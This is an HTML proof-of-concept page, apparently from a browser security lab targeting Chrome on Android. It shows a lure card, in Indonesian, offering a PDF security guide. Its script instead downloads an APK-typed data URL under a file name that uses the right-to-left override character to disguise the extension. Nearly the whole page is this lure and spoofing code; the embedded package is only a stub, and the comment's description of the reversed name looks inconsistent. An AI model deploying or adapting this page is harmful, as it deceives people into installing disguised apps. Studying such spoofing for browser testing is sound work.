<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chrome Android Security Lab - PoC 1</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            padding: 20px; 
            background-color: #f4f4f9;
            color: #333;
            text-align: center;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: 50px auto;
        }
        h1 { font-size: 1.5rem; color: #d93025; }
        p { font-size: 1rem; margin-bottom: 25px; color: #5f6368; }
        .btn-download {
            background-color: #1a73e8;
            color: white;
            padding: 15px 25px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            width: 100%;
        }
        .btn-download:active { background-color: #174ea6; }
        .footer { margin-top: 30px; font-size: 0.8rem; color: #888; }
    </style>
</head>
<body>

    <div class="card">
        <h1>🔒 Security Test</h1>
        <p>Silakan unduh dokumen panduan keamanan terbaru (PDF) untuk melanjutkan.</p>
        
        <button class="btn-download" onclick="triggerSpoof()">
            📄 Download Guide.pdf
        </button>
    </div>

    <div class="footer">
        Laboratorium Pengujian Vulnerability UI/UX<br>
        Target: Chrome Android (Latest)
    </div>

    <script>
        function triggerSpoof() {
            // Ini adalah Header APK minimalis dalam Base64 (hanya untuk trigger browser)
            const apkBase64 = "data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAABAAhVAAAAAAAABfX21hbmVmaXN0X18ucGRmUEsFBgAAAAABAAEAPAAAAE0AAAAAAA==";
            
            const link = document.createElement('a');
            link.href = apkBase64;
            
            /* TRIK RTLO (Right-to-Left Override):
               Karakter \u202e akan membalik teks setelahnya.
               Input: "update_keamanan_\u202ekpa.fdf"
               Hasil Visual di Chrome (jika rentan): "update_keamanan_fdf.apk"
            */
            const fileName = "update_keamanan_\u202ekpa.fdf";
            
            link.download = fileName;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            
            console.log("PoC Executed: Checking for UI Spoofing...");
        }
    </script>

</body>
</html>
